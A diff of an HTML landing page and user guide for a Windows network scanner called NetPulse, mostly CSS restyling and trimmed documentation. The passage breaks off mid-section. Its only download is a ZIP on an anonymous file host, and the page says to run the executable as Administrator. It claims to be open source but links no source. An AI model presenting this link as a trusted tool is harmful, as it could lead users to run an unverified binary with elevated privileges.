@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NetPulse Network Scanner - Complete User Guide</title>
+    <title>NetPulse Network Scanner - Professional Network Discovery Tool</title>
     <style>
         * {
             margin: 0;
@@ -12,95 +12,180 @@
         }
         
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 100%);
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Inter', system-ui, sans-serif;
+            background: linear-gradient(135deg, #0a0a12 0%, #12121f 50%, #1a1a2e 100%);
             color: #e0e0e0;
             line-height: 1.6;
-            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #1e1e2e;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #89B4FA;
+            border-radius: 5px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #89DCEB;
         }
         
         .container {
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 0 auto;
-            background: #0f0f1a;
-            border-radius: 16px;
-            overflow: hidden;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
         }
         
-        /* Header */
+        /* Glassmorphism Header */
         .header {
-            background: linear-gradient(135deg, #1e1e2e 0%, #2a2a3a 100%);
-            padding: 40px;
+            background: rgba(30, 30, 46, 0.8);
+            backdrop-filter: blur(20px);
+            padding: 60px 40px;
             text-align: center;
-            border-bottom: 3px solid #89B4FA;
+            border-bottom: 1px solid rgba(137, 180, 250, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 30% 50%, rgba(137, 180, 250, 0.1), transparent);
+            pointer-events: none;
+        }
+        
+        .logo {
+            font-size: 5rem;
+            margin-bottom: 20px;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
         }
         
         .header h1 {
-            font-size: 2.5rem;
-            color: #89B4FA;
-            margin-bottom: 10px;
-        }
-        
-        .header .subtitle {
-            color: #a6adc8;
-            font-size: 1.1rem;
-        }
-        
-        .header .version {
-            display: inline-block;
-            background: #313244;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 0.8rem;
-            margin-top: 15px;
-            color: #cdd6f4;
-        }
-        
-        /* Download Banner */
-        .download-banner {
-            background: linear-gradient(135deg, #89B4FA, #89DCEB);
-            padding: 30px;
-            text-align: center;
-            color: #1e1e2e;
-        }
-        
-        .download-banner h2 {
+            font-size: 3rem;
+            background: linear-gradient(135deg, #89B4FA, #CBA6F7, #89DCEB);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
             margin-bottom: 15px;
-            font-size: 1.8rem;
+            animation: glow 3s ease-in-out infinite;
+        }
+        
+        @keyframes glow {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.9; }
+        }
+        
+        .tagline {
+            color: #a6adc8;
+            font-size: 1.2rem;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .version {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(49, 50, 68, 0.8);
+            backdrop-filter: blur(10px);
+            padding: 8px 20px;
+            border-radius: 40px;
+            font-size: 0.85rem;
+            margin-top: 20px;
+            border: 1px solid rgba(137, 180, 250, 0.3);
+        }
+        
+        /* Hero Download Section */
+        .hero-download {
+            background: linear-gradient(135deg, #1e1e2e, #2a2a3a);
+            margin: 40px;
+            border-radius: 24px;
+            padding: 50px;
+            text-align: center;
+            border: 1px solid rgba(137, 180, 250, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hero-download::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(137, 180, 250, 0.05), transparent);
+            pointer-events: none;
+        }
+        
+        .hero-download h2 {
+            font-size: 2rem;
+            margin-bottom: 15px;
+            color: #89B4FA;
         }
         
         .download-btn {
-            display: inline-block;
-            background: #1e1e2e;
-            color: #89B4FA;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background: linear-gradient(135deg, #89B4FA, #89DCEB);
+            color: #1e1e2e;
             font-size: 1.3rem;
             font-weight: bold;
-            padding: 15px 40px;
-            border-radius: 50px;
+            padding: 18px 50px;
+            border-radius: 60px;
             text-decoration: none;
-            margin: 15px 0;
-            transition: transform 0.2s, box-shadow 0.2s;
+            margin: 20px 0;
+            transition: all 0.3s ease;
             border: none;
             cursor: pointer;
+            box-shadow: 0 10px 30px rgba(137, 180, 250, 0.3);
         }
         
         .download-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-            background: #313244;
-            color: #89DCEB;
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(137, 180, 250, 0.4);
+            background: linear-gradient(135deg, #89DCEB, #89B4FA);
         }
         
         .download-info {
-            font-size: 0.8rem;
-            margin-top: 10px;
-            opacity: 0.8;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin-top: 20px;
+            font-size: 0.85rem;
+            color: #a6adc8;
+        }
+        
+        .download-info span {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: rgba(49, 50, 68, 0.5);
+            padding: 5px 12px;
+            border-radius: 20px;
         }
         
         /* Navigation */
         .nav {
-            background: #181825;
+            background: rgba(24, 24, 37, 0.95);
+            backdrop-filter: blur(10px);
             padding: 15px 30px;
             border-bottom: 1px solid #313244;
             position: sticky;
@@ -112,45 +197,50 @@
             list-style: none;
             display: flex;
             flex-wrap: wrap;
-            gap: 20px;
+            justify-content: center;
+            gap: 10px;
         }
         
         .nav a {
             color: #cdd6f4;
             text-decoration: none;
-            padding: 8px 16px;
-            border-radius: 8px;
+            padding: 10px 20px;
+            border-radius: 30px;
             transition: all 0.3s;
             font-size: 0.9rem;
+            font-weight: 500;
         }
         
         .nav a:hover {
-            background: #313244;
-            color: #89B4FA;
+            background: #89B4FA;
+            color: #1e1e2e;
+            transform: translateY(-2px);
         }
         
         /* Content */
         .content {
             padding: 40px;
+            max-width: 1200px;
+            margin: 0 auto;
         }
         
         section {
-            margin-bottom: 50px;
+            margin-bottom: 60px;
             scroll-margin-top: 80px;
         }
         
         h2 {
-            color: #89B4FA;
-            font-size: 1.8rem;
-            margin-bottom: 20px;
+            font-size: 2rem;
+            margin-bottom: 25px;
             padding-bottom: 10px;
-            border-bottom: 2px solid #313244;
+            border-bottom: 2px solid #89B4FA;
+            display: inline-block;
         }
         
         h3 {
             color: #CBA6F7;
-            font-size: 1.3rem;
-            margin: 25px 0 15px 0;
+            font-size: 1.4rem;
+            margin: 30px 0 15px 0;
         }
         
         h4 {
@@ -159,63 +249,86 @@
             margin: 20px 0 10px 0;
         }
         
-        p {
-            margin-bottom: 15px;
-            color: #cdd6f4;
+        /* Cards */
+        .card {
+            background: rgba(30, 30, 46, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 25px;
+            margin: 20px 0;
+            border: 1px solid rgba(137, 180, 250, 0.15);
+            transition: all 0.3s ease;
         }
         
-        .card {
-            background: #1e1e2e;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-            border-left: 4px solid #89B4FA;
+        .card:hover {
+            border-color: rgba(137, 180, 250, 0.4);
+            transform: translateY(-2px);
         }
         
         .card.warning {
-            border-left-color: #F38BA8;
+            border-left: 4px solid #F38BA8;
+            background: rgba(243, 139, 168, 0.05);
         }
         
         .card.info {
-            border-left-color: #89DCEB;
+            border-left: 4px solid #89DCEB;
+            background: rgba(137, 220, 235, 0.05);
         }
         
         .card.success {
-            border-left-color: #A6E3A1;
+            border-left: 4px solid #A6E3A1;
+            background: rgba(166, 227, 161, 0.05);
         }
         
-        code {
-            background: #181825;
-            padding: 2px 8px;
-            border-radius: 6px;
-            font-family: 'Consolas', monospace;
+        /* Feature Grid */
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        
+        .feature-item {
+            background: rgba(30, 30, 46, 0.7);
+            backdrop-filter: blur(10px);
+            padding: 25px;
+            border-radius: 20px;
+            text-align: center;
+            border: 1px solid rgba(137, 180, 250, 0.15);
+            transition: all 0.3s ease;
+        }
+        
+        .feature-item:hover {
+            transform: translateY(-5px);
+            border-color: #89B4FA;
+            box-shadow: 0 10px 30px rgba(137, 180, 250, 0.1);
+        }
+        
+        .feature-icon {
+            font-size: 2.8rem;
+            margin-bottom: 15px;
+        }
+        
+        .feature-item h4 {
+            margin-bottom: 10px;
+        }
+        
+        .feature-item p {
             font-size: 0.9rem;
-            color: #89DCEB;
-        }
-        
-        pre {
-            background: #181825;
-            padding: 15px;
-            border-radius: 8px;
-            overflow-x: auto;
-            margin: 15px 0;
-            border: 1px solid #313244;
-        }
-        
-        pre code {
-            background: none;
-            padding: 0;
             color: #a6adc8;
         }
         
+        /* Tables */
         table {
             width: 100%;
             border-collapse: collapse;
             margin: 20px 0;
+            border-radius: 12px;
+            overflow: hidden;
         }
         
         th, td {
-            padding: 12px;
+            padding: 14px;
             text-align: left;
             border-bottom: 1px solid #313244;
         }
@@ -227,15 +340,21 @@
         }
         
         td {
-            background: #1e1e2e;
+            background: rgba(30, 30, 46, 0.5);
         }
         
+        tr:hover td {
+            background: rgba(49, 50, 68, 0.5);
+        }
+        
+        /* Badges */
         .badge {
             display: inline-block;
             background: #313244;
-            padding: 3px 10px;
-            border-radius: 12px;
+            padding: 4px 12px;
+            border-radius: 20px;
             font-size: 0.75rem;
+            font-weight: 600;
             margin-right: 8px;
         }
         
@@ -244,104 +363,186 @@
         .badge.red { background: #F38BA8; color: #1e1e2e; }
         .badge.purple { background: #CBA6F7; color: #1e1e2e; }
         
-        .feature-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 20px;
-            margin: 20px 0;
+        /* Code blocks */
+        code {
+            background: #181825;
+            padding: 3px 10px;
+            border-radius: 8px;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 0.85rem;
+            color: #89DCEB;
         }
         
-        .feature-item {
-            background: #1e1e2e;
+        pre {
+            background: #181825;
             padding: 20px;
             border-radius: 12px;
-            text-align: center;
+            overflow-x: auto;
+            margin: 15px 0;
             border: 1px solid #313244;
-            transition: transform 0.2s;
         }
         
-        .feature-item:hover {
-            transform: translateY(-3px);
-            border-color: #89B4FA;
+        pre code {
+            background: none;
+            padding: 0;
+            color: #a6adc8;
         }
         
-        .feature-icon {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-        }
-        
-        .footer {
-            background: #181825;
-            padding: 30px;
-            text-align: center;
-            border-top: 1px solid #313244;
-            color: #6c7086;
-            font-size: 0.8rem;
-        }
-        
-        .shortcut {
-            display: inline-block;
-            background: #313244;
-            padding: 4px 10px;
-            border-radius: 6px;
-            font-family: monospace;
-            font-size: 0.8rem;
-            margin: 0 2px;
-        }
-        
+        /* Step numbers */
         .step-number {
-            display: inline-block;
-            background: #89B4FA;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #89B4FA, #89DCEB);
             color: #1e1e2e;
-            width: 28px;
-            height: 28px;
+            width: 32px;
+            height: 32px;
             border-radius: 50%;
-            text-align: center;
-            line-height: 28px;
             font-weight: bold;
-            margin-right: 10px;
+            margin-right: 12px;
             font-size: 0.9rem;
         }
         
+        /* Footer */
+        .footer {
+            background: #181825;
+            padding: 40px;
+            text-align: center;
+            border-top: 1px solid #313244;
+            margin-top: 40px;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: #89B4FA;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Responsive */
         @media (max-width: 768px) {
             .content { padding: 20px; }
-            .header h1 { font-size: 1.8rem; }
-            h2 { font-size: 1.4rem; }
-            .nav ul { gap: 10px; }
-            .nav a { padding: 5px 10px; font-size: 0.8rem; }
-            .download-btn { font-size: 1rem; padding: 12px 30px; }
+            .header h1 { font-size: 2rem; }
+            .hero-download { margin: 20px; padding: 30px; }
+            .download-btn { font-size: 1rem; padding: 14px 30px; }
             .feature-grid { grid-template-columns: 1fr; }
+            .nav ul { gap: 5px; }
+            .nav a { padding: 6px 12px; font-size: 0.75rem; }
+            h2 { font-size: 1.5rem; }
+        }
+        
+        /* Animations */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        section {
+            animation: fadeInUp 0.6s ease-out;
+        }
+        
+        /* Stats Bar */
+        .stats-bar {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin: 30px 0;
+            flex-wrap: wrap;
+        }
+        
+        .stat {
+            text-align: center;
+            padding: 15px 25px;
+            background: rgba(30, 30, 46, 0.5);
+            border-radius: 16px;
+            min-width: 120px;
+        }
+        
+        .stat-number {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #89B4FA;
+        }
+        
+        .stat-label {
+            font-size: 0.8rem;
+            color: #a6adc8;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Header -->
+        <!-- Glassmorphism Header -->
         <div class="header">
-            <h1>🌐 NetPulse Network Scanner</h1>
-            <div class="subtitle">Professional Network Discovery & Analysis Tool for Windows</div>
-            <div class="version">Version 1.0.0 | Built with WPF .NET 8.0</div>
+            <div class="logo">🌐</div>
+            <h1>NetPulse Network Scanner</h1>
+            <div class="tagline">Professional network discovery and analysis tool for Windows</div>
+            <div class="version">
+                <span>📌 Version 1.0.0</span>
+                <span>⚡ WPF .NET 8.0</span>
+                <span>🔓 Open Source</span>
+            </div>
         </div>
         
-        <!-- Download Banner -->
-        <div class="download-banner">
-            <h2>📥 Ready to Scan Your Network?</h2>
-            <a href="https://files.catbox.moe/olh16d.zip" class="download-btn">⬇ DOWNLOAD NETPULSE v1.0.0 (62MB)</a>
-            <div class="download-info">⚡ No account required • Direct download • Free forever • Windows 10/11</div>
+        <!-- Hero Download Section -->
+        <div class="hero-download">
+            <h2>⚡ Ready to explore your network?</h2>
+            <a href="https://files.catbox.moe/olh16d.zip" class="download-btn">
+                ⬇ DOWNLOAD NETPULSE v1.0.0
+            </a>
+            <div class="download-info">
+                <span>📦 62 MB</span>
+                <span>🪟 Windows 10/11</span>
+                <span>⚡ No account required</span>
+                <span>💾 Portable (no install)</span>
+            </div>
+        </div>
+        
+        <!-- Stats Bar -->
+        <div class="stats-bar">
+            <div class="stat">
+                <div class="stat-number">18+</div>
+                <div class="stat-label">Ports Scanned</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">10,000+</div>
+                <div class="stat-label">Vendors in DB</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">~60s</div>
+                <div class="stat-label">Full Scan Time</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">6</div>
+                <div class="stat-label">Scan Stages</div>
+            </div>
         </div>
         
         <!-- Navigation -->
         <div class="nav">
             <ul>
                 <li><a href="#overview">Overview</a></li>
-                <li><a href="#download-install">Download & Install</a></li>
+                <li><a href="#download">Download & Install</a></li>
                 <li><a href="#quick-start">Quick Start</a></li>
-                <li><a href="#scanning">Scanning</a></li>
                 <li><a href="#features">Features</a></li>
                 <li><a href="#context-menu">Context Menu</a></li>
-                <li><a href="#search">Search & Filter</a></li>
-                <li><a href="#export">Export</a></li>
-                <li><a href="#troubleshooting">Troubleshooting</a></li>
+                <li><a href="#search">Search</a></li>
                 <li><a href="#faq">FAQ</a></li>
                 <li><a href="#credits">Credits</a></li>
             </ul>
@@ -352,132 +553,68 @@
             <!-- Overview Section -->
             <section id="overview">
                 <h2>📋 Overview</h2>
-                <p><strong>NetPulse Network Scanner</strong> is a professional-grade Windows desktop application that discovers and analyzes devices on your local network. It provides detailed information about connected devices including IP addresses, hostnames, MAC addresses, manufacturers, open ports, running services, and SNMP information.</p>
-                
                 <div class="card info">
-                    <strong>💡 What makes NetPulse special?</strong><br>
-                    • Real-time device discovery with live updates<br>
-                    • Service fingerprinting that identifies what's actually running on ports<br>
-                    • MAC address vendor lookup using IEEE OUI database<br>
-                    • One-click connections to SSH, RDP, and web interfaces<br>
-                    • Fully asynchronous scanning - UI never freezes!
+                    <p><strong>NetPulse Network Scanner</strong> is a professional-grade Windows desktop application that discovers and analyzes devices on your local network. Built with WPF .NET 8.0 and MVVM architecture, it provides enterprise-level network discovery in a clean, user-friendly interface.</p>
+                </div>
+                
+                <div class="feature-grid">
+                    <div class="feature-item">
+                        <div class="feature-icon">⚡</div>
+                        <h4>Blazing Fast</h4>
+                        <p>Async scanning with 30 concurrent threads</p>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">🎨</div>
+                        <h4>Modern UI</h4>
+                        <p>Dark theme with smooth animations</p>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">🔐</div>
+                        <h4>Privacy First</h4>
+                        <p>No data collection, runs completely offline</p>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">🔄</div>
+                        <h4>Real-time Updates</h4>
+                        <p>Live device discovery as scan progresses</p>
+                    </div>
                 </div>
             </section>
             
             <!-- Download & Install -->
-            <section id="download-install">
+            <section id="download">
                 <h2>📥 Download & Installation</h2>
                 
-                <h3>Step 1: Download</h3>
+                <h3>📦 Get NetPulse</h3>
                 <div class="card">
-                    <p>Click the download button above or use this link:</p>
+                    <p><strong>Download Link:</strong></p>
                     <pre><code>https://files.catbox.moe/olh16d.zip</code></pre>
-                    <p><strong>File size:</strong> 62 MB<br>
-                    <strong>Format:</strong> ZIP archive</p>
+                    <p><strong>File size:</strong> 62 MB | <strong>Format:</strong> ZIP archive (portable)</p>
                 </div>
                 
-                <h3>Step 2: Extract</h3>
+                <h3>🚀 Installation Steps</h3>
                 <div class="card">
-                    <ol>
-                        <li>Right-click the downloaded ZIP file</li>
-                        <li>Select <strong>Extract All</strong></li>
-                        <li>Choose a destination folder (e.g., Desktop or Documents)</li>
-                        <li>Click <strong>Extract</strong></li>
-                    </ol>
+                    <p><span class="step-number">1</span> Download the ZIP file</p>
+                    <p><span class="step-number">2</span> Right-click → Extract All</p>
+                    <p><span class="step-number">3</span> Right-click <code>NetPulseScanner.exe</code> → Run as Administrator</p>
+                    <p><span class="step-number">4</span> Click "Start Scan" to begin!</p>
                 </div>
                 
-                <h3>Step 3: Run the Application</h3>
                 <div class="card warning">
-                    <ol>
-                        <li>Navigate to the extracted folder</li>
-                        <li><strong>Right-click</strong> <code>NetPulseScanner.exe</code></li>
-                        <li>Select <strong>Run as Administrator</strong></li>
-                        <li>Click <strong>Yes</strong> on the UAC prompt</li>
-                    </ol>
-                    <p style="margin-top: 10px;"><strong>⚠️ Important:</strong> Administrator privileges are required for MAC address detection. The app will still run without admin, but MAC addresses will show as "Unavailable".</p>
-                </div>
-                
-                <h3>Step 4: First Launch</h3>
-                <div class="card success">
-                    <p>When you first launch NetPulse, you'll see:</p>
-                    <ul>
-                        <li>Your local IP address and subnet mask</li>
-                        <li>"Loading OUI database..." status (first time only, takes ~5 seconds)</li>
-                        <li>Ready to scan</li>
-                    </ul>
+                    <strong>⚠️ Important:</strong> Administrator privileges are required for MAC address detection. Without admin, MAC addresses will show as "Unavailable".
                 </div>
             </section>
             
             <!-- Quick Start -->
             <section id="quick-start">
                 <h2>🚀 Quick Start Guide</h2>
-                <div class="card">
-                    <h4><span class="step-number">1</span> Click "Start Scan"</h4>
-                    <p>The app will automatically detect your network and begin discovering devices.</p>
-                    
-                    <h4><span class="step-number">2</span> Watch devices appear</h4>
-                    <p>Results appear in real-time as devices respond to ping requests.</p>
-                    
-                    <h4><span class="step-number">3</span> Explore results</h4>
-                    <p>View IP addresses, hostnames, MAC addresses, vendors, open ports, and SNMP info.</p>
-                    
-                    <h4><span class="step-number">4</span> Right-click any device</h4>
-                    <p>Access quick actions like SSH, RDP, browser, ping, and copy info.</p>
-                    
-                    <h4><span class="step-number">5</span> Export results</h4>
-                    <p>Click "Export CSV" to save your scan results.</p>
-                </div>
-            </section>
-            
-            <!-- Scanning -->
-            <section id="scanning">
-                <h2>🔍 How Scanning Works</h2>
-                <p>NetPulse performs a comprehensive multi-stage scan of your local network:</p>
-                
-                <table>
-                    <tr>
-                        <th>Stage</th>
-                        <th>What It Does</th>
-                        <th>Information Gathered</th>
-                    </tr>
-                    <tr>
-                        <td>1. Discovery</td>
-                        <td>ICMP ping sweep of all IPs in your subnet</td>
-                        <td>Active devices, ping response time</td>
-                    </tr>
-                    <tr>
-                        <td>2. MAC & Vendor</td>
-                        <td>ARP table lookup + OUI database query</td>
-                        <td>MAC address, device manufacturer</td>
-                    </tr>
-                    <tr>
-                        <td>3. DNS Resolution</td>
-                        <td>Reverse DNS lookup</td>
-                        <td>Hostname</td>
-                    </tr>
-                    <tr>
-                        <td>4. Port Scanning</td>
-                        <td>TCP connect scan to common ports (21-8443)</td>
-                        <td>Open ports + service identification</td>
-                    </tr>
-                    <tr>
-                        <td>5. Service Fingerprinting</td>
-                        <td>Banner grabbing and signature matching</td>
-                        <td>Service names, versions, banners</td>
-                    </tr>
-                    <tr>
-                        <td>6. SNMP Query</td>
-                        <td>SNMPv2c query for sysName/sysDescr</td>
-                        <td>SNMP device name and description</td>
-                    </tr>
-                </table>
-                
-                <div class="card info">
-                    <strong>📊 Ports Scanned:</strong> 21 (FTP), 22 (SSH), 23 (Telnet), 25 (SMTP), 53 (DNS), 80 (HTTP), 110 (POP3), 143 (IMAP), 443 (HTTPS), 445 (SMB), 3306 (MySQL), 3389 (RDP), 5432 (PostgreSQL), 5900 (VNC), 6379 (Redis), 8080 (HTTP-Alt), 8443 (HTTPS-Alt), 27017 (MongoDB)
-                </div>
-                
-                <div class="card">
-                    <strong>⏱️ Scan Duration:</strong> A full scan of a /24 subnet (254 IPs) typically takes 30-60 seconds depending on your network speed and the number of active devices.
+                <div class="card success">
+                    <h4>🎯 5 Steps to Scan Your Network</h4>
+                    <p><span class="step-number">1</span> Launch NetPulse as Administrator</p>
+                    <p><span class="step-number">2</span> Click <span class="badge blue">▶ Start Scan</span></p>
+                    <p><span class="step-number">3</span> Watch devices appear in real-time</p>
+                    <p><span class="step-number">4</span> Right-click any device for actions</p>
+                    <p><span class="step-number">5</span> Click <span class="badge green">💾 Export CSV</span> to save results</p>
                 </div>
             </section>
             
@@ -489,27 +626,27 @@
                     <div class="feature-item">
                         <div class="feature-icon">🌐</div>
                         <h4>Network Discovery</h4>
-                        <p>Auto-detects your local subnet and finds all active devices</p>
+                        <p>Auto-detects your local subnet and finds all active devices with ICMP ping sweep</p>
                     </div>
                     <div class="feature-item">
                         <div class="feature-icon">🔌</div>
                         <h4>Port Scanning</h4>
-                        <p>Scans 18 common TCP ports with service detection</p>
+                        <p>Scans 18 common TCP ports with service fingerprinting and banner grabbing</p>
                     </div>
                     <div class="feature-item">
                         <div class="feature-icon">🏭</div>
                         <h4>Vendor Lookup</h4>
-                        <p>Identifies device manufacturers via IEEE OUI database</p>
+                        <p>Identifies device manufacturers via IEEE OUI database (10,000+ vendors)</p>
                     </div>
                     <div class="feature-item">
                         <div class="feature-icon">💻</div>
                         <h4>Service Detection</h4>
-                        <p>Banner grabbing to identify specific software and versions</p>
+                        <p>Identifies specific software and versions (Apache, nginx, OpenSSH, MySQL, etc.)</p>
                     </div>
                     <div class="feature-item">
                         <div class="feature-icon">🔍</div>
                         <h4>Real-time Search</h4>
-                        <p>Instant filtering across all columns</p>
+                        <p>Instant filtering across all columns as you type</p>
                     </div>
                     <div class="feature-item">
                         <div class="feature-icon">💾</div>
@@ -527,9 +664,9 @@
                         <p>Copy IP or full device details to clipboard</p>
                     </div>
                     <div class="feature-item">
-                        <div class="feature-icon">🎨</div>
-                        <h4>Dark Theme</h4>
-                        <p>Eye-friendly dark mode interface</p>
+                        <div class="feature-icon">🔧</div>
+                        <h4>OUI Updater</h4>
+                        <p>One-click update of vendor database from IEEE</p>
                     </div>
                     <div class="feature-item">
                         <div class="feature-icon">⏹️</div>
@@ -541,8 +678,8 @@
             
             <!-- Context Menu -->
             <section id="context-menu">
-                <h2>🖱️ Context Menu (Right-Click)</h2>
-                <p>Right-click any device in the results grid to access these quick actions:</p>
+                <h2>🖱️ Context Menu</h2>
+                <p>Right-click any device in the results grid to access these actions:</p>
                 
                 <table>
                     <tr>
@@ -551,156 +688,79 @@
                         <th>Network Impact</th>
                     </tr>
                     <tr>
-                        <td><span class="badge">🔌 Open SSH</span></td>
-                        <td>Opens SSH connection to the device (prompts for username)</td>
-                        <td>Creates TCP connection to port 22</td>
+                        <td><span class="badge blue">🔌 Open SSH</span></td>
+                        <td>Opens SSH connection (prompts for username)</td>
+                        <td>TCP port 22</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">🖥️ Remote Desktop</span></td>
-                        <td>Launches Windows RDP client to the device</td>
-                        <td>Creates TCP connection to port 3389</td>
+                        <td><span class="badge blue">🖥️ Remote Desktop</span></td>
+                        <td>Launches Windows RDP client</td>
+                        <td>TCP port 3389</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">🌐 Open in Browser</span></td>
-                        <td>Opens device IP in default web browser</td>
-                        <td>HTTP/HTTPS GET request</td>
+                        <td><span class="badge blue">🌐 Open in Browser</span></td>
+                        <td>Opens device IP in default browser</td>
+                        <td>HTTP/HTTPS GET</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">📡 Ping (continuous)</span></td>
-                        <td>Opens cmd window with continuous ping</td>
+                        <td><span class="badge">📡 Ping</span></td>
+                        <td>Continuous ping in cmd window</td>
                         <td>ICMP echo requests</td>
                     </tr>
                     <tr>
                         <td><span class="badge">🔍 Traceroute</span></td>
-                        <td>Shows network path to the device</td>
-                        <td>ICMP with increasing TTL</td>
+                        <td>Shows network path to device</td>
+                        <td>ICMP with TTL</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">📋 Copy IP Address</span></td>
-                        <td>Copies IP to clipboard</td>
+                        <td><span class="badge green">📋 Copy IP</span></td>
+                        <td>Copies IP address to clipboard</td>
                         <td>None</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">📄 Copy Full Info</span></td>
-                        <td>Copies all device details to clipboard</td>
+                        <td><span class="badge green">📄 Copy Full Info</span></td>
+                        <td>Copies all device details</td>
                         <td>None</td>
                     </tr>
                     <tr>
-                        <td><span class="badge">ℹ️ About</span></td>
-                        <td>Shows application information and credits</td>
+                        <td><span class="badge purple">ℹ️ About</span></td>
+                        <td>Shows app information and credits</td>
                         <td>None</td>
                     </tr>
                 </table>
-                
-                <div class="card warning">
-                    <strong>⚠️ Connection Confirmation</strong><br>
-                    For security, SSH, RDP, and Browser actions show a confirmation dialog before connecting. This prevents accidental connections.
-                </div>
             </section>
             
-            <!-- Search & Filter -->
+            <!-- Search -->
             <section id="search">
                 <h2>🔎 Search & Filter</h2>
-                <p>The search bar at the top of the window filters results in real-time as you type.</p>
-                
                 <div class="card">
-                    <h4>Searchable Fields:</h4>
+                    <p>The search bar filters results in real-time across:</p>
                     <ul>
-                        <li><strong>IP Address</strong> - e.g., <code>192.168.1</code></li>
-                        <li><strong>Hostname</strong> - e.g., <code>router</code>, <code>printer</code></li>
-                        <li><strong>MAC Address</strong> - e.g., <code>00:14:22</code></li>
-                        <li><strong>Vendor</strong> - e.g., <code>Cisco</code>, <code>Apple</code>, <code>Intel</code></li>
-                        <li><strong>Open Ports</strong> - e.g., <code>22</code>, <code>80</code>, <code>HTTP</code></li>
-                        <li><strong>SNMP Name</strong></li>
-                        <li><strong>Status</strong></li>
+                        <li>📡 <strong>IP Address</strong> - <code>192.168.1</code></li>
+                        <li>💻 <strong>Hostname</strong> - <code>router</code>, <code>printer</code></li>
+                        <li>🔌 <strong>MAC Address</strong> - <code>00:14:22</code></li>
+                        <li>🏭 <strong>Vendor</strong> - <code>Cisco</code>, <code>Apple</code></li>
+                        <li>🔌 <strong>Open Ports</strong> - <code>22</code>, <code>HTTP</code></li>
                     </ul>
                 </div>
                 
-                <h4>Search Examples:</h4>
-                <table>
-                    <tr><th>Search Term</th><th>Finds</th></tr>
-                    <tr><td><code>192.168</code></td><td>All devices on that subnet</td></tr>
-                    <tr><td><code>apple</code></td><td>Apple devices (iPhones, Macs, etc.)</td></tr>
-                    <tr><td><code>22</code></td><td>Devices with SSH open (port 22)</td></tr>
-                    <tr><td><code>http</code></td><td>Devices with web servers</td></tr>
-                    <tr><td><code>cisco</code></td><td>Cisco networking equipment</td></tr>
-                    <tr><td><code>mysql</code></td><td>Devices running MySQL databases</td></tr>
-                    <tr><td><code>192.168.1.1</code></td><td>Specific IP address</td></tr>
-                </table>
-                
-                <div class="card info">
-                    <strong>📊 Result Counter:</strong> Shows <code>📊 X / Y devices</code> where X is filtered count and Y is total discovered. Click the <strong>✖ Clear</strong> button to reset the search.
+                <div class="feature-grid">
+                    <div class="feature-item">
+                        <div class="feature-icon">🔍</div>
+                        <h4>Example: Find all web servers</h4>
+                        <p>Search: <code>80</code> or <code>http</code> or <code>443</code></p>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">🍎</div>
